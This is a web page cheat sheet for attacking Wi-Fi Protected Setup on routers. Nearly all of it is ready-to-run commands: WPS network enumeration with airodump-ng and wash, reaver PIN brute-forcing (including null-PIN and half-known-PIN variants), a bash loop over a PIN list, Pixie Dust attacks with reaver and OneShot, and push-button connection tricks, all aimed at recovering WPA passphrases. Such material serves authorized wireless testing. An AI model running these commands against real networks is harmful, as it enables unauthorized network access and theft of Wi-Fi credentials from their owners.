title: Attacking Wi-Fi Protected Setup (WPS)
html:
Attacking Wi-Fi Protected Setup (WPS)

WPS Reconnaissance

Enable Monitor Mode.

airmon-ng start wlan0

Enumerate available Wi-Fi networks with WPS using airodump-ng.

airodump-ng --wps wlan0mon

Enumerate available Wi-Fi networks with WPS using wash.

wash -i wlan0mon

Enumerate available Wi-Fi networks with WPS using wash with verbose output.

wash -j -i wlan0mon

Vendor lookup using BSSID.

grep -i "84-1B-5E" /var/lib/ieee-data/oui.txt

Online PIN Brute-Forcing Attacks

Add new monitor mode interface.

`iw dev wlan0 interface add mon0 type monitor`<br>`ifconfig mon0 up`

WPS PIN Bruteforce using reaver.

reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1

WPS PIN Bruteforce using half known PIN.

reaver -i mon0 -b B2:A5:1D:E1:B2:11 -c 1 -p 1234

WPS Null PIN Authentication.

reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " "

Retrieve WPA-PSK using a Known PIN.

sudo reaver -i mon0 -b 60:38:E0:2A:4F:21 -p 88766197

WPS pin generation using BSSID.

wpspin -A 60:38:E0:A2:3D:2A

Bash script to Bruteforce WPS pins using a PIN list.

`#!/bin/bash`<br>`PINS='73834410 94229882 73834410'`<br>`for PIN in $PINS`<br>`do`<br>   `echo Attempting PIN: $PIN`<br>   `sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN`<br>`done`<br>`echo "PIN Guesses Complete"`

Offline PIN Brute Forcing Attacks

Perform Pixie Dust attack using Reaver.

reaver -K 1 -vvv -b 86:FC:9F:5D:67:4E -c 1 -i mon0

Perform Pixie Dust attack using OneShot.

python3 oneshot.py -b 86:FC:9F:5D:67:4E -i wlan0mon -K

Misc WPS Attacks

Scan for available WiFi networks.

wpa_cli scan_results

Connect to WPS wifi network using wpa_cli with PBC method.

wpa_cli wps_pbc D8:D6:3D:EB:29:D5

Connect to WPS wifi network using OneShot with PBC method.

python3 /opt/OneShot/oneshot.py -i wlan0mon --pbc

Bruteforce WPS PIN using reaver with lock delay of 100 seconds and sleep for 45 seconds every 3 pin attempts

sudo reaver -l 100 -r 3:45 -i wlan0mon -b 60:38:E0:XX:XX:XX
